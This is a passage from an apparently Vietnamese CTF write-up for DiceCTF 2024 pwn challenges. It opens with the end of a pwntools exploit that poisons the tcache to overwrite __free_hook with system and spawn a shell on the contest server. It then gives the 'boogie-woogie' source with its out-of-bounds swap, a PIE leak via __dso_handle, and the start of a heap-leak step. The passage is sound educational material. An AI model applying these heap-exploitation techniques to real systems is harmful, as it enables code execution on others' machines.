</span></span><span style="display:flex;"><span>        gdb<span style="color:#f92672">.</span>attach(io, cmd)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>: 
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">=</span>remote(<span style="color:#e6db74">&#39;mc.ax&#39;</span>, <span style="color:#ae81ff">32526</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#io=remote(&#39;0&#39;, 1337)</span>
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#39;./libc-2.27.so&#39;</span>)
</span></span><span style="display:flex;"><span>elf<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#39;./chall_patched&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">str_</span>(size, ll):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;size? &#39;</span>, str(size)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> size:
</span></span><span style="display:flex;"><span>        sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>send(ll)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">tok</span>(idx, delim):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;idx? &#39;</span>, str(idx)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;delim? &#39;</span>, delim)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">del_</span>(idx):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;idx? &#39;</span>, str(idx)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exit_</span>():
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;4&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">2</span>):
</span></span><span style="display:flex;"><span>    str_(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;aa&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>del_(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>del_(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>str_(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span>)
</span></span><span style="display:flex;"><span>tok(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>heap <span style="color:#f92672">=</span> u64(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0\0</span><span style="color:#e6db74">&#39;</span>) <span style="color:#f92672">-</span>  <span style="color:#ae81ff">0x260</span>
</span></span><span style="display:flex;"><span>del_(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>print(hex(heap))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>str_(<span style="color:#ae81ff">0x4f8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>)
</span></span><span style="display:flex;"><span>str_(<span style="color:#ae81ff">0x20</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>)
</span></span><span style="display:flex;"><span>del_(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>str_(<span style="color:#ae81ff">0x4f8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x60</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>tok(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0\0</span><span style="color:#e6db74">&#39;</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x3ebc60</span>
</span></span><span style="display:flex;"><span>print(hex(libc<span style="color:#f92672">.</span>address))
</span></span><span style="display:flex;"><span><span style="color:#75715e"># del_(0)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>str_(<span style="color:#ae81ff">0x38</span>, p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x60</span>)<span style="color:#f92672">+</span>p64(heap<span style="color:#f92672">+</span><span style="color:#ae81ff">0x7d0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>) <span style="color:#75715e"># 2</span>
</span></span><span style="display:flex;"><span>str_(<span style="color:#ae81ff">0x28</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x28</span>) <span style="color:#75715e"># 3</span>
</span></span><span style="display:flex;"><span>str_(<span style="color:#ae81ff">0xf8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;B&#39;</span>) <span style="color:#75715e"># 4</span>
</span></span><span style="display:flex;"><span>tok(<span style="color:#ae81ff">3</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x01</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>del_(<span style="color:#ae81ff">3</span>)
</span></span><span style="display:flex;"><span>str_(<span style="color:#ae81ff">0x28</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x20</span><span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x60</span>)) <span style="color:#75715e"># 3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">7</span>):
</span></span><span style="display:flex;"><span>    str_(<span style="color:#ae81ff">0xf8</span>, str(i)<span style="color:#f92672">.</span>encode()) <span style="color:#75715e"># 5 -&gt; 12</span>
</span></span><span style="display:flex;"><span>str_(<span style="color:#ae81ff">0x68</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;C&#39;</span>) <span style="color:#75715e"># 13</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">7</span>):
</span></span><span style="display:flex;"><span>    del_(i<span style="color:#f92672">+</span><span style="color:#ae81ff">5</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>del_(<span style="color:#ae81ff">4</span>) 
</span></span><span style="display:flex;"><span>str_(<span style="color:#ae81ff">0x158</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;test&#39;</span>) 
</span></span><span style="display:flex;"><span>del_(<span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span>del_(<span style="color:#ae81ff">3</span>)
</span></span><span style="display:flex;"><span>str_(<span style="color:#ae81ff">0x158</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;test&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">10</span><span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x30</span>)<span style="color:#f92672">+</span>p64(libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>__free_hook)) 
</span></span><span style="display:flex;"><span>str_(<span style="color:#ae81ff">0x28</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span>) 
</span></span><span style="display:flex;"><span>str_(<span style="color:#ae81ff">0x28</span>, p64(libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>system))  
</span></span><span style="display:flex;"><span>str_(<span style="color:#ae81ff">0x100</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh&#39;</span>)
</span></span><span style="display:flex;"><span>del_(<span style="color:#ae81ff">6</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h1 id="pwn---boogie-woogie">Pwn - boogie-woogie</h1>
<h2 id="source-code-overview-1">Source code overview</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stddef.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdbool.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;dlfcn.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// generate art.h with echo &#34;const unsigned char __art[] = {$((ascii-image-converter ./aoi-todo.webp  --color --dither --braille --width 80; echo -ne &#34;\x00&#34;) | xxd -i)};&#34; &gt; art.h
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;art.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> data[] <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;Listen closely, cursed spirit. There is no way you do not know this. An arm is</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">merely a decoration. The act of applause is an acclamation of the soul!&#34;</span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">clap</span>(<span style="color:#66d9ef">size_t</span> a, <span style="color:#66d9ef">size_t</span> b)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    data[a] <span style="color:#f92672">^=</span> data[b];
</span></span><span style="display:flex;"><span>    data[b] <span style="color:#f92672">^=</span> data[a];
</span></span><span style="display:flex;"><span>    data[a] <span style="color:#f92672">^=</span> data[b];
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// gcc main.c -o boogie-woogie
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// set line buffering. comment this to let libc decide when to buffer (based on pty)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// setvbuf(dlsym(NULL, &#34;stdout&#34;), NULL, _IOLBF, 0);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, __art);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[0;33mEven this cursed spirit uses Black Flash. The one who is now being left behind</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">is me. You’ve gotten strong, brother. Are you gonna just sit still, </span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[4;33mAoi Todo</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[0;33m?!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Are you gonna let your brother feel alone again, </span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[4;33mAoi Todo</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[0;33m?!</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[0m</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (data[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">size_t</span> a, b <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n\x1b</span><span style="color:#e6db74">[31;49;1;4m%s</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[0m</span><span style="color:#ae81ff">\n\n\n</span><span style="color:#e6db74">&#34;</span>, data);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;The sound of </span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[0;33mgion shoja bells</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[0m echoes the impermanence of all things. The color</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">of </span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[0;33msala flowers</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[0m reveals the truth that the prosperous must decline. </span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[4;33mHowever</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[0m! We</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">are the exception:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%zu %zu&#34;</span>, <span style="color:#f92672">&amp;</span>a, <span style="color:#f92672">&amp;</span>b);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">clap</span>(a, b);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Chương trình nhìn có vẻ đơn giản, nhận 2 số làm input, swap 2 kí tự ở mảng toàn cục <code>data</code> và sẽ in ra mảng đó sau khi swap.</p>
<p>Không có đoạn code nào check input của ta nên dễ thấy OOB xuất hiện và từ đó có thể swap byte với mọi phân vùng <code>rw*</code> trong binary.</p>
<h2 id="solution-1">Solution</h2>
<h3 id="leak-pie">Leak PIE</h3>
<p><a href="https://wiki.osdev.org/C%2B%2B#GCC">__dso_handle</a> ?</p>
<p>Nó được đưa vào tham số thứ 3 của hàm <code>__cxa_atexit</code> và được dùng để xác định dynamic shared objects trong quá trình hủy đối tượng toàn cục (thông thường là ở quá trình kết thúc chương trình)</p>
<p><code>int __cxa_atexit(void (*destructor) (void *), void *arg, void *__dso_handle);</code></p>
<p>Nhìn vào đoạn code dưới đây, khi mà ta thay đổi giá trị của <code>__dso_handle</code> thì không có ý nghĩa trong việc khai thác lắm</p>
<p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/stdlib/cxa_finalize.c">stdlib/cxa_finalize.c</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;assert.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;exit.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;register-atfork.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sysdep.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/* If D is non-NULL, call all functions registered with `__cxa_atexit&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">   with the same dso handle.  Otherwise, if D is NULL, call all of the
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">   registered handlers.  */</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__cxa_finalize</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>d)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> exit_function_list <span style="color:#f92672">*</span>funcs;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__libc_lock_lock</span> (__exit_funcs_lock);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> restart:
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (funcs <span style="color:#f92672">=</span> __exit_funcs; funcs; funcs <span style="color:#f92672">=</span> funcs<span style="color:#f92672">-&gt;</span>next)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">struct</span> exit_function <span style="color:#f92672">*</span>f;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">for</span> (f <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>funcs<span style="color:#f92672">-&gt;</span>fns[funcs<span style="color:#f92672">-&gt;</span>idx <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>]; f <span style="color:#f92672">&gt;=</span> <span style="color:#f92672">&amp;</span>funcs<span style="color:#f92672">-&gt;</span>fns[<span style="color:#ae81ff">0</span>]; <span style="color:#f92672">--</span>f)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> ((d <span style="color:#f92672">==</span> NULL <span style="color:#f92672">||</span> d <span style="color:#f92672">==</span> f<span style="color:#f92672">-&gt;</span>func.cxa.dso_handle) <span style="color:#f92672">&amp;&amp;</span> f<span style="color:#f92672">-&gt;</span>flavor <span style="color:#f92672">==</span> ef_cxa)
</span></span><span style="display:flex;"><span>	  {
</span></span><span style="display:flex;"><span>	    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">uint64_t</span> check <span style="color:#f92672">=</span> __new_exitfn_called;
</span></span><span style="display:flex;"><span>	    <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>cxafn) (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>arg, <span style="color:#66d9ef">int</span> status) <span style="color:#f92672">=</span> f<span style="color:#f92672">-&gt;</span>func.cxa.fn;
</span></span><span style="display:flex;"><span>	    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>cxaarg <span style="color:#f92672">=</span> f<span style="color:#f92672">-&gt;</span>func.cxa.arg;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	    <span style="color:#75715e">/* We don&#39;t want to run this cleanup more than once.  The Itanium
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       C++ ABI requires that multiple calls to __cxa_finalize not
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       result in calling termination functions more than once.  One
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       potential scenario where that could happen is with a concurrent
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       dlclose and exit, where the running dlclose must at some point
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       release the list lock, an exiting thread may acquire it, and
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       without setting flavor to ef_free, might re-run this destructor
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       which could result in undefined behaviour.  Therefore we must
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       set flavor to ef_free to avoid calling this destructor again.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       Note that the concurrent exit must also take the dynamic loader
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       lock (for library finalizer processing) and therefore will
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       block while dlclose completes the processing of any in-progress
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       exit functions. Lastly, once we release the list lock for the
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       entry marked ef_free, we must not read from that entry again
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       since it may have been reused by the time we take the list lock
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       again.  Lastly the detection of new registered exit functions is
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       based on a monotonically incrementing counter, and there is an
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       ABA if between the unlock to run the exit function and the
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       re-lock after completion the user registers 2^64 exit functions,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       the implementation will not detect this and continue without
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       executing any more functions.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       One minor issue remains: A registered exit function that is in
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       progress by a call to dlclose() may not completely finish before
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       the next registered exit function is run. This may, according to
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       some readings of POSIX violate the requirement that functions
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       run in effective LIFO order.  This should probably be fixed in a
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       future implementation to ensure the functions do not run in
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       parallel.  */</span>
</span></span><span style="display:flex;"><span>	    f<span style="color:#f92672">-&gt;</span>flavor <span style="color:#f92672">=</span> ef_free;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef PTR_DEMANGLE
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	    <span style="color:#a6e22e">PTR_DEMANGLE</span> (cxafn);
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	    <span style="color:#75715e">/* Unlock the list while we call a foreign function.  */</span>
</span></span><span style="display:flex;"><span>	    <span style="color:#a6e22e">__libc_lock_unlock</span> (__exit_funcs_lock);
</span></span><span style="display:flex;"><span>	    <span style="color:#a6e22e">cxafn</span> (cxaarg, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>	    <span style="color:#a6e22e">__libc_lock_lock</span> (__exit_funcs_lock);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	    <span style="color:#75715e">/* It is possible that that last exit function registered
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       more exit functions.  Start the loop over.  */</span>
</span></span><span style="display:flex;"><span>	    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">__glibc_unlikely</span> (check <span style="color:#f92672">!=</span> __new_exitfn_called))
</span></span><span style="display:flex;"><span>	      <span style="color:#66d9ef">goto</span> restart;
</span></span><span style="display:flex;"><span>	  }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Also remove the quick_exit handlers, but do not call them.  */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (funcs <span style="color:#f92672">=</span> __quick_exit_funcs; funcs; funcs <span style="color:#f92672">=</span> funcs<span style="color:#f92672">-&gt;</span>next)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">struct</span> exit_function <span style="color:#f92672">*</span>f;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">for</span> (f <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>funcs<span style="color:#f92672">-&gt;</span>fns[funcs<span style="color:#f92672">-&gt;</span>idx <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>]; f <span style="color:#f92672">&gt;=</span> <span style="color:#f92672">&amp;</span>funcs<span style="color:#f92672">-&gt;</span>fns[<span style="color:#ae81ff">0</span>]; <span style="color:#f92672">--</span>f)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (d <span style="color:#f92672">==</span> NULL <span style="color:#f92672">||</span> d <span style="color:#f92672">==</span> f<span style="color:#f92672">-&gt;</span>func.cxa.dso_handle)
</span></span><span style="display:flex;"><span>	  f<span style="color:#f92672">-&gt;</span>flavor <span style="color:#f92672">=</span> ef_free;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Remove the registered fork handlers.  We do not have to
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     unregister anything if the program is going to terminate anyway.  */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (d <span style="color:#f92672">!=</span> NULL)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">UNREGISTER_ATFORK</span> (d);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__libc_lock_unlock</span> (__exit_funcs_lock);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Tuy nhiên, có 1 điều chú ý ở đây là nó trỏ đến chính địa chỉ của nó trong phân vùng .bss, từ đây ta có thể dễ dàng leak được PIE.</p>
<pre tabindex="0"><code>pwndbg&gt; tel &amp;__dso_handle
00:0000│  0x555555563008 (__dso_handle) ◂— 0x555555563008
</code></pre><h3 id="leak-heap">Leak HEAP</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">╭─</span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#f92672">~/</span>CTF<span style="color:#f92672">/</span>Pwnable<span style="color:#f92672">/</span><span style="color:#ae81ff">2024</span><span style="color:#f92672">/</span>dicectf<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie <span style="color:#960050;background-color:#1e0010"></span>                                                                                      <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#960050;background-color:#1e0010">✔</span> <span style="color:#960050;background-color:#1e0010"></span> w1n_gl0ry<span style="color:#960050;background-color:#1e0010">@</span>phis1Ng <span style="color:#960050;background-color:#1e0010">─╮</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">╰─</span> cat <span style="color:#f92672">/</span>proc<span style="color:#f92672">/</span><span style="color:#ae81ff">155341</span><span style="color:#f92672">/</span>maps                                                                                                                                         <span style="color:#960050;background-color:#1e0010">─╯</span>
